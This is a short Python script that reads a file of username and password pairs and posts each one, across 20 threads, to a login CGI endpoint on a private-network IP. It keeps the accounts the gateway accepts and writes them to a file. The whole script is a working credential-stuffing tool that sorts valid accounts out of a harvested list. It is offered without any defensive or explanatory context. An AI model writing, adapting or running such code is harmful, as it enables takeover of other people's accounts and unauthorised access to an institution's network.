import requests
import json
from threading import Thread, Lock
from TaskManager.TaskManager import task_partition

PassportFile = '../LoginFacade/res/passport.txt'

LoginUrl = 'http://172.20.13.100/cgi-bin/do_login'
TargetFile = 'res/passport.txt'
Passports = list()
lock = Lock()


def connector(raw_passport: list):
    form_data = dict(username='', password='')
    passports = list()
    for p in raw_passport:
        form_data['username'], form_data['password'] = p['username'], p['password']
        r = requests.post(LoginUrl, form_data).text
        if r == 'ip_exist_error' or r.isdigit():
            print('ID:%s CODE:%s' % (p['username'], p['password']))
            passports.append(p)
    global Passports
    with lock:
        Passports += passports


if __name__ == '__main__':
    with open(PassportFile, 'r') as file:
        passports = json.load(file)
    partitions = task_partition(0, len(passports), 20)
    threads = [Thread(target=connector, args=(passports[p[0]:p[1]],)) for p in partitions]
    for t in threads:
        t.start()
    for t in threads:
        t.join()
    with open(TargetFile, 'w') as file:
        json.dump(Passports, file)
